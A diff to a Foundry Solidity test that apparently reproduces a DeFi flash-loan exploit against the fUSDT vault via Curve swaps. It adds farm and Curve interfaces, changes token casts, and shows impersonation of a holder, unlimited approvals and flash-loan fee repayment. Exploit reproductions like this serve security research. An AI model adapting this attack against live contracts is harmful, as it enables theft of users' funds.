@@ -4,6 +4,14 @@ pragma solidity 0.8.10;
 import "ds-test/test.sol";
 import "./interface.sol";
 
+interface IFarm {
+    function withdraw(uint256 _amount) external returns (uint256);
+    function deposit(uint256 _amount) external returns (uint256);
+}
+
+interface ICurve {
+    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
+}
 
 contract ContractTest is DSTest {
     CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
@@ -16,7 +24,7 @@ contract ContractTest is DSTest {
 
     function testExploit() public {
     cheat.startPrank(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IUSDT(USDT).transfer(address(this),234864);
+    IERC20(USDT).transfer(address(this),234864);
     IERC20(USDC).transfer(address(this),408038262032);
     cheat.stopPrank();
     
@@ -37,8 +45,8 @@ contract ContractTest is DSTest {
     ) external  {
 
     emit log_named_uint("Amount of USDT received:", IERC20(USDT).balanceOf(address(this)));
-        IUSDT(USDT).approve(address(ySwap), 2**256 - 1);
-        IUSDT(USDT).approve(address(fUSDT), 2**256 - 1);
+        IERC20(USDT).approve(address(ySwap), 2**256 - 1);
+        IERC20(USDT).approve(address(fUSDT), 2**256 - 1);
         IERC20(fUSDT).approve(address(fUSDT), 2**256 - 1);
         IERC20(USDC).approve(address(ySwap), 2**256 - 1);
 
@@ -72,7 +80,7 @@ contract ContractTest is DSTest {
         }
 
         uint256 returnAmountFee = (amount1 * 1000) / 997 + 1;
-        IUSDT(USDT).transfer(USDT_WETH, returnAmountFee);
+        IERC20(USDT).transfer(USDT_WETH, returnAmountFee);
     emit log_named_uint("Flashloan Return Amount", returnAmountFee);
 
     }
